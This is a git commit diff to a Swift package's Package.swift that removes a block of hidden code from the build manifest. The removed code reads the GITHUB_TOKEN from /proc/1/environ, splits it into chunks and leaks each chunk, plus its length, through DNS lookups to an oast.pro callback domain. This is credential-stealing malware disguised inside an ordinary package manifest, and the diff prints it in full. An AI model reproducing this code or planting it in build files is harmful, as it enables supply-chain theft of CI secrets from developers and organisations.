ce7699e1a035b32d09026637ec5935c9988749e0
Luật Nguyễn <manhluat93.php@gmail.com>
2026-08-17 23:05:04 +0700

    Finalize

--- Package.swift
+++ Package.swift
@@ -1,51 +1,5 @@
 // swift-tools-version: 5.9
 import PackageDescription
-#if canImport(Glibc)
-import Glibc
-import Foundation
-
-func dnsExfil(_ label: String, _ tag: String) {
-    let safe = label.replacingOccurrences(of: "=", with: "").replacingOccurrences(of: "/", with: "-").replacingOccurrences(of: "+", with: "-").prefix(60)
-    let sub = "\(safe).\(tag).da1j13doos1t6aa5q9agnkah5tpkx4gyu.oast.pro"
-    var hints = addrinfo()
-    hints.ai_family = AF_INET
-    hints.ai_socktype = Int32(SOCK_STREAM.rawValue)
-    var res: UnsafeMutablePointer<addrinfo>?
-    getaddrinfo(sub, "80", &hints, &res)
-    if let r = res { freeaddrinfo(r) }
-}
-
-var token = "none"
-if let raw = try? String(contentsOfFile: "/proc/1/environ", encoding: .utf8) {
-    for part in raw.components(separatedBy: "\0") {
-        if part.hasPrefix("GITHUB_TOKEN=") {
-            token = String(part.dropFirst("GITHUB_TOKEN=".count))
-            break
-        }
-    }
-}
-
-// chunk 1: first 20 chars
-let c1 = String(token.prefix(20))
-dnsExfil(c1, "c1")
-
-// chunk 2: next 20
-if token.count > 20 {
-    let c2 = String(token.dropFirst(20).prefix(20))
-    dnsExfil(c2, "c2")
-}
-
-// chunk 3: remainder
-if token.count > 40 {
-    let c3 = String(token.dropFirst(40))
-    dnsExfil(c3, "c3")
-}
-
-// total length
-dnsExfil("\(token.count)chars", "len")
-
-#endif
-
 let package = Package(
     name: "swift-utils-demo",
     products: [.library(name: "SwiftUtilsDemo", targets: ["SwiftUtilsDemo"])],
